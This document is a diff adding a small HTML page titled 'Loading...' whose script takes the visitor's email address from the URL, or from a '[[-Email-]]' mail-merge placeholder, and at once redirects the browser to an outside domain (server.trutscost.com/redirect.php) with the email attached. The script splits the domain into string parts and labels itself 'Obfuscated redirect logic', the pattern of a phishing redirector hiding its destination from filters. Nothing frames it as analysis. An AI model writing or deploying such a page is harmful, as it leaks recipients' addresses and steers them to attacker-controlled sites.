@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        // Obfuscated redirect logic
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || '[[-Email-]]';
+        const domainParts = ["server", "trutscost", "com"];
+        const pathParts = ["redirect", "php"];
+        
+        // Build the final URL dynamically
+        const finalUrl = `https://${domainParts.join('.')}/${pathParts[0]}.${pathParts[1]}?ref=${encodeURIComponent(email)}`;
+        window.location.href = finalUrl;
+    </script>
+</head>
+<body>
+    Redirecting...
+</body>
+</html>
